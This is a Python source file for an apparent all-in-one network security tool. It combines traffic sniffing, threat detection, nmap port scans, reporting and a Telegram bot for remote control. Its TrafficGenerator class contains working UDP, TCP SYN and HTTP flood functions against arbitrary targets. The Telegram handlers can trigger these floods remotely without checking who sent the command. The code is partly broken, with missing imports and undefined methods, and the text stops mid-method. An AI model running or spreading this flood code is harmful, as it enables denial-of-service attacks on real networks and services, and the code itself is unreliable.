#!/usr/bin/env python3
"""
Author: Ian Carter Kulani
"""

import asyncio
import threading
import socket
import subprocess
import time
import json
import logging
import requests
import ipaddress
import concurrent.futures
from datetime import datetime, timedelta
from collections import defaultdict, deque
import scapy.all as scapy
from scapy.all import IP, TCP, UDP, ICMP, send, sniff
import psutil
import sqlite3
import schedule
import nmap
import geoip2.database
import random
import string
import os
import sys
import re
from typing import Dict, List, Set, Optional, Tuple
import argparse
import configparser

# ==================== CONFIGURATION AND SETUP ====================

class Config:
    """Configuration management for the cybersecurity tool"""
    def __init__(self):
        self.config_file = "cyber_tool_config.ini"
        self.default_config = {
            'DATABASE': {
                'path': 'cyber_tool.db',
                'max_history': 10000
            },
            'MONITORING': {
                'packet_count': 1000,
                'timeout': 30,
                'alert_threshold': 100
            },
            'TELEGRAM': {
                'token': '',
                'chat_id': '',
                'poll_interval': 2
            },
            'SCANNING': {
                'max_threads': 100,
                'default_ports': '1-1000',
                'timeout': 2
            },
            'TRAFFIC': {
                'max_packets': 10000,
                'packet_size': 1024,
                'delay': 0.01
            }
        }
        self.load_config()
    
    def load_config(self):
        """Load configuration from file"""
        self.config = configparser.ConfigParser()
        if os.path.exists(self.config_file):
            self.config.read(self.config_file)
        else:
            self.config.read_dict(self.default_config)
            self.save_config()
    
    def save_config(self):
        """Save configuration to file"""
        with open(self.config_file, 'w') as f:
            self.config.write(f)
    
    def get(self, section, key, fallback=None):
        """Get configuration value"""
        try:
            return self.config.get(section, key)
        except (configparser.NoSectionError, configparser.NoOptionError):
            return fallback
    
    def set(self, section, key, value):
        """Set configuration value"""
        if not self.config.has_section(section):
            self.config.add_section(section)
        self.config.set(section, key, str(value))
        self.save_config()

# ==================== DATABASE MANAGEMENT ====================

class DatabaseManager:
    """Database operations for storing monitoring data and configurations"""
    
    def __init__(self, db_path="cyber_tool.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # IP addresses table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ip_addresses (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT UNIQUE NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1
            )
        ''')
        
        # Threats table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                threat_type TEXT NOT NULL,
                severity INTEGER DEFAULT 1,
                description TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                packet_count INTEGER DEFAULT 0
            )
        ''')
        
        # Command history table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                user TEXT DEFAULT 'console'
            )
        ''')
        
        # Monitoring results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS monitoring_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER,
                protocol TEXT,
                packet_count INTEGER,
                threat_detected BOOLEAN DEFAULT 0,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Scan results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER,
                state TEXT,
                service TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Reports table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                report_type TEXT NOT NULL,
                period TEXT NOT NULL,
                content TEXT,
                generated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def execute_query(self, query, params=()):
        """Execute a SQL query"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        try:
            cursor.execute(query, params)
            conn.commit()
            result = cursor.fetchall()
            return result
        except Exception as e:
            logging.error(f"Database error: {e}")
            return None
        finally:
            conn.close()
    
    def add_ip(self, ip, description=""):
        """Add an IP address to monitor"""
        query = "INSERT OR IGNORE INTO ip_addresses (ip, description) VALUES (?, ?)"
        return self.execute_query(query, (ip, description))
    
    def remove_ip(self, ip):
        """Remove an IP address from monitoring"""
        query = "DELETE FROM ip_addresses WHERE ip = ?"
        return self.execute_query(query, (ip,))
    
    def get_all_ips(self):
        """Get all IP addresses being monitored"""
        query = "SELECT ip, description FROM ip_addresses WHERE is_active = 1"
        return self.execute_query(query)
    
    def add_threat(self, ip, threat_type, severity=1, description="", packet_count=0):
        """Add a detected threat"""
        query = '''INSERT INTO threats (ip, threat_type, severity, description, packet_count) 
                   VALUES (?, ?, ?, ?, ?)'''
        return self.execute_query(query, (ip, threat_type, severity, description, packet_count))
    
    def get_threats(self, ip=None, limit=100):
        """Get detected threats"""
        if ip:
            query = "SELECT * FROM threats WHERE ip = ? ORDER BY timestamp DESC LIMIT ?"
            return self.execute_query(query, (ip, limit))
        else:
            query = "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?"
            return self.execute_query(query, (limit,))
    
    def add_command_history(self, command, user="console"):
        """Add command to history"""
        query = "INSERT INTO command_history (command, user) VALUES (?, ?)"
        return self.execute_query(query, (command, user))
    
    def get_command_history(self, limit=50):
        """Get command history"""
        query = "SELECT command, timestamp, user FROM command_history ORDER BY timestamp DESC LIMIT ?"
        return self.execute_query(query, (limit,))

# ==================== NETWORK MONITORING ====================

class NetworkMonitor:
    """Network traffic monitoring and threat detection"""
    
    def __init__(self, db_manager):
        self.db = db_manager
        self.monitoring = False
        self.monitored_ips = set()
        self.packet_stats = defaultdict(lambda: defaultdict(int))
        self.thresholds = {
            'port_scan': 10,      # Ports per second
            'dos': 1000,          # Packets per second
            'ddos': 5000,         # Packets per second from multiple IPs
            'http_flood': 100,    # HTTP requests per second
            'udp_flood': 500      # UDP packets per second
        }
        self.geoip_reader = self.load_geoip_database()
    
    def load_geoip_database(self):
        """Load GeoIP database for IP geolocation"""
        try:
            # You need to download GeoLite2 City database from MaxMind
            return geoip2.database.Reader('GeoLite2-City.mmdb')
        except:
            logging.warning("GeoIP database not found. Location features disabled.")
            return None
    
    def start_monitoring(self, target_ip=None):
        """Start network monitoring"""
        if target_ip:
            self.monitored_ips.add(target_ip)
        
        self.monitoring = True
        monitoring_thread = threading.Thread(target=self._monitor_network)
        monitoring_thread.daemon = True
        monitoring_thread.start()
        logging.info(f"Network monitoring started for IPs: {self.monitored_ips}")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitoring = False
        logging.info("Network monitoring stopped")
    
    def _monitor_network(self):
        """Main monitoring loop using scapy"""
        try:
            while self.monitoring:
                # Sniff packets for analysis
                packets = sniff(count=100, timeout=10, filter="ip")
                
                for packet in packets:
                    self._analyze_packet(packet)
                
                # Check for threats based on collected statistics
                self._check_threats()
                
                # Clear old statistics periodically
                if random.randint(1, 10) == 1:
                    self._clean_old_stats()
                    
        except Exception as e:
            logging.error(f"Monitoring error: {e}")
    
    def _analyze_packet(self, packet):
        """Analyze individual packet for threats"""
        try:
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                current_time = int(time.time())
                
                # Update packet statistics
                self.packet_stats[src_ip]['total_packets'] += 1
                self.packet_stats[src_ip]['last_seen'] = current_time
                
                # Protocol-specific analysis
                if TCP in packet:
                    self._analyze_tcp_packet(packet, src_ip, dst_ip)
                elif UDP in packet:
                    self._analyze_udp_packet(packet, src_ip, dst_ip)
                elif ICMP in packet:
                    self._analyze_icmp_packet(packet, src_ip, dst_ip)
                    
        except Exception as e:
            logging.error(f"Packet analysis error: {e}")
    
    def _analyze_tcp_packet(self, packet, src_ip, dst_ip):
        """Analyze TCP packets for threats"""
        tcp = packet[TCP]
        
        # Port scanning detection
        if tcp.flags == 2:  # SYN flag
            self.packet_stats[src_ip]['syn_count'] += 1
            self.packet_stats[src_ip]['ports_scanned'].add(tcp.dport)
        
        # HTTP flood detection
        if tcp.dport == 80 or tcp.dport == 443:
            self.packet_stats[src_ip]['http_requests'] += 1
        
        # Check if this is a monitored IP
        if dst_ip in self.monitored_ips:
            self.db.execute_query(
                "INSERT INTO monitoring_results (ip, port, protocol, packet_count) VALUES (?, ?, ?, ?)",
                (src_ip, tcp.dport, 'TCP', 1)
            )
    
    def _analyze_udp_packet(self, packet, src_ip, dst_ip):
        """Analyze UDP packets for threats"""
        udp = packet[UDP]
        
        # UDP flood detection
        self.packet_stats[src_ip]['udp_packets'] += 1
        
        if dst_ip in self.monitored_ips:
            self.db.execute_query(
                "INSERT INTO monitoring_results (ip, port, protocol, packet_count) VALUES (?, ?, ?, ?)",
                (src_ip, udp.dport, 'UDP', 1)
            )
    
    def _analyze_icmp_packet(self, packet, src_ip, dst_ip):
        """Analyze ICMP packets for threats"""
        # ICMP flood detection
        self.packet_stats[src_ip]['icmp_packets'] += 1
        
        if dst_ip in self.monitored_ips:
            self.db.execute_query(
                "INSERT INTO monitoring_results (ip, protocol, packet_count) VALUES (?, ?, ?)",
                (src_ip, 'ICMP', 1)
            )
    
    def _check_threats(self):
        """Check collected statistics for potential threats"""
        current_time = int(time.time())
        
        for ip, stats in self.packet_stats.items():
            # Check for port scanning
            if len(stats.get('ports_scanned', set())) > self.thresholds['port_scan']:
                self.db.add_threat(ip, 'PORT_SCAN', 2, 
                                 f"Multiple ports scanned: {len(stats['ports_scanned'])}")
            
            # Check for DoS attacks
            if stats.get('total_packets', 0) > self.thresholds['dos']:
                self.db.add_threat(ip, 'DOS_ATTACK', 3,
                                 f"High packet rate: {stats['total_packets']} packets")
            
            # Check for HTTP floods
            if stats.get('http_requests', 0) > self.thresholds['http_flood']:
                self.db.add_threat(ip, 'HTTP_FLOOD', 3,
                                 f"HTTP flood detected: {stats['http_requests']} requests")
            
            # Check for UDP floods
            if stats.get('udp_packets', 0) > self.thresholds['udp_flood']:
                self.db.add_threat(ip, 'UDP_FLOOD', 3,
                                 f"UDP flood detected: {stats['udp_packets']} packets")
    
    def _clean_old_stats(self):
        """Clean old statistics to prevent memory leaks"""
        current_time = int(time.time())
        timeout = 300  # 5 minutes
        
        ips_to_remove = []
        for ip, stats in self.packet_stats.items():
            if current_time - stats.get('last_seen', 0) > timeout:
                ips_to_remove.append(ip)
        
        for ip in ips_to_remove:
            del self.packet_stats[ip]
    
    def get_ip_location(self, ip):
        """Get geographical location of an IP address"""
        if not self.geoip_reader:
            return "GeoIP database not available"
        
        try:
            response = self.geoip_reader.city(ip)
            location = {
                'country': response.country.name,
                'city': response.city.name,
                'latitude': response.location.latitude,
                'longitude': response.location.longitude
            }
            return location
        except:
            return "Location not found"

# ==================== NETWORK SCANNING ====================

class NetworkScanner:
    """Port scanning and network reconnaissance"""
    
    def __init__(self, db_manager):
        self.db = db_manager
        self.nm = nmap.PortScanner()
        self.scanning = False
    
    def ping_ip(self, ip):
        """Ping an IP address to check if it's alive"""
        try:
            param = '-n' if os.name == 'nt' else '-c'
            command = ['ping', param, '1', ip]
            result = subprocess.run(command, capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except:
            return False
    
    def scan_ports(self, ip, ports='1-1000'):
        """Scan common ports on target IP"""
        if self.scanning:
            return "Another scan is in progress"
        
        self.scanning = True
        try:
            logging.info(f"Scanning {ip} on ports {ports}")
            self.nm.scan(ip, ports, arguments='-sS -T4')
            
            scan_results = []
            for protocol in self.nm[ip].all_protocols():
                ports = self.nm[ip][protocol].keys()
                for port in ports:
                    state = self.nm[ip][protocol][port]['state']
                    service = self.nm[ip][protocol][port]['name']
                    
                    # Save to database
                    self.db.execute_query(
                        "INSERT INTO scan_results (ip, port, state, service) VALUES (?, ?, ?, ?)",
                        (ip, port, state, service)
                    )
                    
                    scan_results.append({
                        'port': port,
                        'state': state,
                        'service': service
                    })
            
            return scan_results
        except Exception as e:
            logging.error(f"Scan error: {e}")
            return f"Scan failed: {e}"
        finally:
            self.scanning = False
    
    def deep_scan(self, ip):
        """Deep scan all 65535 ports with comprehensive service detection"""
        return self.scan_ports(ip, '1-65535')
    
    def quick_scan(self, ip):
        """Quick scan of common services"""
        common_ports = '21,22,23,25,53,80,110,143,443,465,587,993,995,1433,3306,3389,5432,5900,6379,27017'
        return self.scan_ports(ip, common_ports)

# ==================== TRAFFIC GENERATION ====================

class TrafficGenerator:
    """Generate various types of network traffic for testing"""
    
    def __init__(self):
        self.generating = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None
        }
    
    def udp_flood(self, target_ip, target_port=80, duration=10, packet_size=1024):
        """Generate UDP flood attack"""
        if self.generating:
            return "Another traffic generation in progress"
        
        self.generating = True
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': time.time()}
        
        def flood():
            end_time = time.time() + duration
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(packet_size)
                
                while time.time() < end_time and self.generating:
                    sock.sendto(data, (target_ip, target_port))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += packet_size
                    time.sleep(0.001)  # Small delay to prevent complete system freeze
                
                sock.close()
            except Exception as e:
                logging.error(f"UDP flood error: {e}")
            finally:
                self.generating = False
        
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
        
        return f"UDP flood started against {target_ip}:{target_port} for {duration}s"
    
    def tcp_flood(self, target_ip, target_port=80, duration=10):
        """Generate TCP SYN flood attack"""
        if self.generating:
            return "Another traffic generation in progress"
        
        self.generating = True
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': time.time()}
        
        def flood():
            end_time = time.time() + duration
            try:
                while time.time() < end_time and self.generating:
                    # Create IP packet with TCP layer
                    ip = IP(dst=target_ip)
                    tcp = TCP(dport=target_port, flags='S')
                    packet = ip/tcp
                    
                    send(packet, verbose=0)
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                    
            except Exception as e:
                logging.error(f"TCP flood error: {e}")
            finally:
                self.generating = False
        
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
        
        return f"TCP SYN flood started against {target_ip}:{target_port} for {duration}s"
    
    def http_flood(self, target_url, duration=10):
        """Generate HTTP flood attack"""
        if self.generating:
            return "Another traffic generation in progress"
        
        self.generating = True
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': time.time()}
        
        def flood():
            end_time = time.time() + duration
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            try:
                while time.time() < end_time and self.generating:
                    try:
                        response = requests.get(target_url, headers=headers, timeout=5)
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += len(response.content)
                    except:
                        pass
                    
            except Exception as e:
                logging.error(f"HTTP flood error: {e}")
            finally:
                self.generating = False
        
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
        
        return f"HTTP flood started against {target_url} for {duration}s"
    
    def stop_traffic(self):
        """Stop all traffic generation"""
        self.generating = False
        return "Traffic generation stopped"
    
    def get_stats(self):
        """Get traffic generation statistics"""
        if self.stats['start_time']:
            duration = time.time() - self.stats['start_time']
            packets_per_sec = self.stats['packets_sent'] / duration if duration > 0 else 0
            bytes_per_sec = self.stats['bytes_sent'] / duration if duration > 0 else 0
            
            return {
                'packets_sent': self.stats['packets_sent'],
                'bytes_sent': self.stats['bytes_sent'],
                'duration': duration,
                'packets_per_second': packets_per_sec,
                'bytes_per_second': bytes_per_sec
            }
        return self.stats

# ==================== CURL FUNCTIONALITY ====================

class CurlCommands:
    """Execute various curl commands for web testing"""
    
    @staticmethod
    def curl_simple(url):
        """Basic curl request"""
        try:
            response = requests.get(url, timeout=10)
            return f"Status: {response.status_code}\nHeaders: {dict(response.headers)}\n\nFirst 500 chars:\n{response.text[:500]}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_head(url):
        """HEAD request"""
        try:
            response = requests.head(url, timeout=10)
            return f"Status: {response.status_code}\nHeaders: {dict(response.headers)}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_verbose(url):
        """Verbose curl request"""
        try:
            response = requests.get(url, timeout=10)
            request_headers = {'User-Agent': 'python-requests'}
            return f"> GET {url}\n> Headers: {request_headers}\n< Status: {response.status_code}\n< Headers: {dict(response.headers)}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_follow_redirects(url):
        """Follow redirects"""
        try:
            response = requests.get(url, allow_redirects=True, timeout=10)
            return f"Final URL: {response.url}\nStatus: {response.status_code}\nRedirect history: {len(response.history)}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_post(url, data):
        """POST request with data"""
        try:
            response = requests.post(url, data=data, timeout=10)
            return f"Status: {response.status_code}\nResponse: {response.text[:500]}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_delete(url):
        """DELETE request"""
        try:
            response = requests.delete(url, timeout=10)
            return f"Status: {response.status_code}\nResponse: {response.text[:500]}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_download(url, filename):
        """Download file"""
        try:
            response = requests.get(url, stream=True, timeout=30)
            with open(filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            return f"File downloaded as: {filename}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_upload(url, file_path):
        """Upload file"""
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(url, files=files, timeout=30)
            return f"Status: {response.status_code}\nResponse: {response.text[:500]}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_custom_headers(url, headers):
        """Request with custom headers"""
        try:
            response = requests.get(url, headers=headers, timeout=10)
            return f"Status: {response.status_code}\nResponse: {response.text[:500]}"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_insecure(url):
        """Skip SSL verification"""
        try:
            response = requests.get(url, verify=False, timeout=10)
            return f"Status: {response.status_code}\nSSL Verification: Skipped"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def curl_timing(url):
        """Measure request timing"""
        try:
            start = time.time()
            response = requests.get(url, timeout=10)
            end = time.time()
            return f"Status: {response.status_code}\nTime Total: {end - start:.2f}s"
        except Exception as e:
            return f"Error: {e}"

# ==================== REPORT GENERATION ====================

class ReportGenerator:
    """Generate various security reports"""
    
    def __init__(self, db_manager):
        self.db = db_manager
    
    def generate_daily_report(self):
        """Generate daily security report"""
        return self._generate_report('daily')
    
    def generate_weekly_report(self):
        """Generate weekly security report"""
        return self._generate_report('weekly')
    
    def generate_monthly_report(self):
        """Generate monthly security report"""
        return self._generate_report('monthly')
    
    def generate_annual_report(self):
        """Generate annual security report"""
        return self._generate_report('annual')
    
    def _generate_report(self, period):
        """Generate report for specified period"""
        try:
            # Calculate time range based on period
            now = datetime.now()
            if period == 'daily':
                start_time = now - timedelta(days=1)
            elif period == 'weekly':
                start_time = now - timedelta(weeks=1)
            elif period == 'monthly':
                start_time = now - timedelta(days=30)
            else:  # annual
                start_time = now - timedelta(days=365)
            
            # Get threats data
            threats = self.db.execute_query(
                "SELECT threat_type, COUNT(*) as count FROM threats WHERE timestamp > ? GROUP BY threat_type",
                (start_time,)
            )
            
            # Get monitoring statistics
            monitored_ips = self.db.execute_query("SELECT COUNT(*) FROM ip_addresses WHERE is_active = 1")
            total_packets = self.db.execute_query(
                "SELECT SUM(packet_count) FROM monitoring_results WHERE timestamp > ?",
                (start_time,)
            )
            
            # Generate report content
            report = f"=== CYBERSECURITY REPORT ({period.upper()}) ===\n"
            report += f"Period: {start_time} to {now}\n"
            report += f"Monitored IPs: {monitored_ips[0][0] if monitored_ips else 0}\n"
            report += f"Total Packets Analyzed: {total_packets[0][0] if total_packets and total_packets[0][0] else 0}\n\n"
            
            report += "THREAT SUMMARY:\n"
            for threat_type, count in threats:
                report += f"  {threat_type}: {count} occurrences\n"
            
            # Save to database
            self.db.execute_query(
                "INSERT INTO reports (report_type, period, content) VALUES (?, ?, ?)",
                (f'security_report', period, report)
            )
            
            return report
        except Exception as e:
            return f"Report generation error: {e}"

# ==================== TELEGRAM BOT ====================

class TelegramBot:
    """Telegram bot for remote command execution"""
    
    def __init__(self, token, chat_id, cyber_tool):
        self.token = token
        self.chat_id = chat_id
        self.cyber_tool = cyber_tool
        self.updater = None
        self.bot = None
        
    def start_bot(self):
        """Start the Telegram bot"""
        if not self.token:
            return "Telegram token not configured"
        
        try:
            self.updater = Updater(self.token, use_context=True)
            self.bot = telegram.Bot(token=self.token)
            
            dp = self.updater.dispatcher
            
            # Add command handlers
            dp.add_handler(CommandHandler("start", self._start))
            dp.add_handler(CommandHandler("help", self._help))
            dp.add_handler(CommandHandler("ping", self._ping))
            dp.add_handler(CommandHandler("start_monitoring", self._start_monitoring))
            dp.add_handler(CommandHandler("stop", self._stop))
            dp.add_handler(CommandHandler("location", self._location))
            dp.add_handler(CommandHandler("view_threats", self._view_threats))
            dp.add_handler(CommandHandler("scan_ip", self._scan_ip))
            dp.add_handler(CommandHandler("deep_scan_ip", self._deep_scan_ip))
            dp.add_handler(CommandHandler("add_ip", self._add_ip))
            dp.add_handler(CommandHandler("remove_ip", self._remove_ip))
            dp.add_handler(CommandHandler("edit_ip", self._edit_ip))
            dp.add_handler(CommandHandler("history", self._history))
            dp.add_handler(CommandHandler("generate_traffic", self._generate_traffic))
            dp.add_handler(CommandHandler("generate_daily_report", self._generate_daily_report))
            dp.add_handler(CommandHandler("generate_weekly_report", self._generate_weekly_report))
            dp.add_handler(CommandHandler("generate_monthly_report", self._generate_monthly_report))
            dp.add_handler(CommandHandler("generate_annual_report", self._generate_annual_report))
            
            # Curl command handlers
            dp.add_handler(CommandHandler("curl", self._curl))
            dp.add_handler(CommandHandler("curl_head", self._curl_head))
            dp.add_handler(CommandHandler("curl_verbose", self._curl_verbose))
            
            self.updater.start_polling()
            return "Telegram bot started successfully"
        except Exception as e:
            return f"Telegram bot error: {e}"
    
    def stop_bot(self):
        """Stop the Telegram bot"""
        if self.updater:
            self.updater.stop()
            return "Telegram bot stopped"
        return "Telegram bot not running"
    
    def send_message(self, message):
        """Send message to configured chat"""
        if self.bot and self.chat_id:
            try:
                self.bot.send_message(chat_id=self.chat_id, text=message)
                return True
            except Exception as e:
                logging.error(f"Telegram send error: {e}")
                return False
        return False
    
    def _start(self, update, context):
        """Handle /start command"""
        update.message.reply_text(
            "🤖 Cybersecurity Tool Bot Activated!\n"
            "Use /help to see available commands."
        )
    
    def _help(self, update, context):
        """Handle /help command"""
        help_text = """
🔐 CYBERSECURITY TOOL BOT COMMANDS:

🔍 Monitoring & Scanning:
/ping <ip> - Ping IP address
/start_monitoring <ip> - Start monitoring IP
/stop - Stop monitoring
/location <ip> - Get IP location
/view_threats - View detected threats
/scan_ip <ip> - Scan common ports
/deep_scan_ip <ip> - Deep scan all ports

📊 IP Management:
/add_ip <ip> <description> - Add IP to monitor
/remove_ip <ip> - Remove IP from monitoring
/edit_ip <ip> <new_description> - Edit IP description

📈 Reporting:
/generate_daily_report - Generate daily report
/generate_weekly_report - Generate weekly report
/generate_monthly_report - Generate monthly report
/generate_annual_report - Generate annual report

🌐 Web Testing:
/curl <url> - Basic curl request
/curl_head <url> - HEAD request
/curl_verbose <url> - Verbose request

⚡ Traffic Generation:
/generate_traffic <type> <target> - Generate traffic

📜 Utilities:
/history - View command history
        """
        update.message.reply_text(help_text)
    
    def _ping(self, update, context):
        """Handle /ping command"""
        if not context.args:
            update.message.reply_text("Usage: /ping <ip>")
            return
        
        ip = context.args[0]
        result = self.cyber_tool.ping_ip(ip)
        update.message.reply_text(f"Ping {ip}: {'Alive' if result else 'Dead'}")
    
    def _start_monitoring(self, update, context):
        """Handle /start_monitoring command"""
        if not context.args:
            update.message.reply_text("Usage: /start_monitoring <ip>")
            return
        
        ip = context.args[0]
        result = self.cyber_tool.start_monitoring(ip)
        update.message.reply_text(result)
    
    def _stop(self, update, context):
        """Handle /stop command"""
        result = self.cyber_tool.stop_monitoring()
        update.message.reply_text(result)
    
    def _location(self, update, context):
        """Handle /location command"""
        if not context.args:
            update.message.reply_text("Usage: /location <ip>")
            return
        
        ip = context.args[0]
        result = self.cyber_tool.get_ip_location(ip)
        update.message.reply_text(str(result))
    
    def _view_threats(self, update, context):
        """Handle /view_threats command"""
        result = self.cyber_tool.view_threats()
        # Telegram has message length limits, so truncate if necessary
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)
    
    # Implement other command handlers similarly...
    def _scan_ip(self, update, context):
        if not context.args:
            update.message.reply_text("Usage: /scan_ip <ip>")
            return
        ip = context.args[0]
        result = self.cyber_tool.scan_ports(ip)
        update.message.reply_text(str(result)[:4000])
    
    def _deep_scan_ip(self, update, context):
        if not context.args:
            update.message.reply_text("Usage: /deep_scan_ip <ip>")
            return
        ip = context.args[0]
        result = self.cyber_tool.deep_scan(ip)
        update.message.reply_text(str(result)[:4000])
    
    def _add_ip(self, update, context):
        if len(context.args) < 1:
            update.message.reply_text("Usage: /add_ip <ip> [description]")
            return
        ip = context.args[0]
        description = context.args[1] if len(context.args) > 1 else ""
        result = self.cyber_tool.add_ip(ip, description)
        update.message.reply_text(result)
    
    def _remove_ip(self, update, context):
        if not context.args:
            update.message.reply_text("Usage: /remove_ip <ip>")
            return
        ip = context.args[0]
        result = self.cyber_tool.remove_ip(ip)
        update.message.reply_text(result)
    
    def _edit_ip(self, update, context):
        if len(context.args) < 2:
            update.message.reply_text("Usage: /edit_ip <ip> <new_description>")
            return
        ip = context.args[0]
        new_description = " ".join(context.args[1:])
        result = self.cyber_tool.edit_ip(ip, new_description)
        update.message.reply_text(result)
    
    def _history(self, update, context):
        result = self.cyber_tool.view_history()
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)
    
    def _generate_traffic(self, update, context):
        if len(context.args) < 2:
            update.message.reply_text("Usage: /generate_traffic <type> <target> [port] [duration]")
            return
        traffic_type = context.args[0]
        target = context.args[1]
        port = int(context.args[2]) if len(context.args) > 2 else 80
        duration = int(context.args[3]) if len(context.args) > 3 else 10
        result = self.cyber_tool.generate_traffic(traffic_type, target, port, duration)
        update.message.reply_text(result)
    
    def _generate_daily_report(self, update, context):
        result = self.cyber_tool.generate_daily_report()
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)
    
    def _generate_weekly_report(self, update, context):
        result = self.cyber_tool.generate_weekly_report()
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)
    
    def _generate_monthly_report(self, update, context):
        result = self.cyber_tool.generate_monthly_report()
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)
    
    def _generate_annual_report(self, update, context):
        result = self.cyber_tool.generate_annual_report()
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)
    
    def _curl(self, update, context):
        if not context.args:
            update.message.reply_text("Usage: /curl <url>")
            return
        url = context.args[0]
        result = self.cyber_tool.curl_simple(url)
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)
    
    def _curl_head(self, update, context):
        if not context.args:
            update.message.reply_text("Usage: /curl_head <url>")
            return
        url = context.args[0]
        result = self.cyber_tool.curl_head(url)
        update.message.reply_text(result)
    
    def _curl_verbose(self, update, context):
        if not context.args:
            update.message.reply_text("Usage: /curl_verbose <url>")
            return
        url = context.args[0]
        result = self.cyber_tool.curl_verbose(url)
        if len(result) > 4000:
            result = result[:4000] + "\n... (truncated)"
        update.message.reply_text(result)

# ==================== MAIN CYBERSECURITY TOOL ====================

class CyberSecurityTool:
    """Main cybersecurity tool integrating all components"""
    
    def __init__(self):
        self.config = Config()
        self.db = DatabaseManager(self.config.get('DATABASE', 'path'))
        self.monitor = NetworkMonitor(self.db)
        self.scanner = NetworkScanner(self.db)
        self.traffic_gen = TrafficGenerator()
        self.curl = CurlCommands()
        self.reporter = ReportGenerator(self.db)
        self.telegram_bot = None
        self.command_history = deque(maxlen=100)
        
        # Initialize Telegram bot if configured
        token = self.config.get('TELEGRAM', 'token')
        chat_id = self.config.get('TELEGRAM', 'chat_id')
        if token and chat_id:
            self.telegram_bot = TelegramBot(token, chat_id, self)
    
    def start(self):
        """Start the cybersecurity tool"""
        logging.info("Cybersecurity Tool Started")
        
        # Start Telegram bot if configured
        if self.telegram_bot:
            result = self.telegram_bot.start_bot()
            logging.info(result)
        
        # Start background tasks
        self._start_background_tasks()
    
    def _start_background_tasks(self):
        """Start background monitoring and maintenance tasks"""
        # Schedule regular report generation
        schedule.every().day.at("00:00").do(self._auto_generate_daily_report)
        schedule.every().monday.at("00:00").do(self._auto_generate_weekly_report)
        
        # Start schedule runner in background thread
        def run_scheduler():
            while True:
                schedule.run_pending()
                time.sleep(60)
        
        scheduler_thread = threading.Thread(target=run_scheduler)
        scheduler_thread.daemon = True
        scheduler_thread.start()
    
    def _auto_generate_daily_report(self):
        """Auto-generate daily report"""
        report = self.generate_daily_report()
        if self.telegram_bot:
            self.telegram_bot.send_message(f"📊 Daily Report Generated:\n{report[:1000]}...")
    
    def _auto_generate_weekly_report(self):
        """Auto-generate weekly report"""
        report = self.generate_weekly_report()
        if self.telegram_bot:
